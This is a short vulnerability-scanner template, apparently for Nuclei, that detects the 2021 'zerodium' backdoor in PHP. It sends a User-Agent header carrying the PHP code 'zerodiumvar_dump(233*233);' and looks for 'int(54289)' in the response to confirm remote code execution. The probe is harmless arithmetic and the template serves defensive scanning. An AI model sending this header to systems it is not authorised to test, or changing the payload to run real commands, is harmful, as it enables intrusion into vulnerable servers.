id: php-zerodium-backdoor-rce
info:
  author: dhiyaneshDk
  description: A backdoor has been introduced into PHP, dubbed 'zerodiumvar_dump',
    the backdoor allowed the execution of arbitrary PHP code.
  name: PHP Zerodium Backdoor RCE
  reference:
  - https://news-web.php.net/php.internals/113838
  severity: critical
  tags: php,backdoor
requests:
- headers:
    User-Agent: zerodiumvar_dump(233*233);
  matchers:
  - part: body
    type: word
    words:
    - int(54289)
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
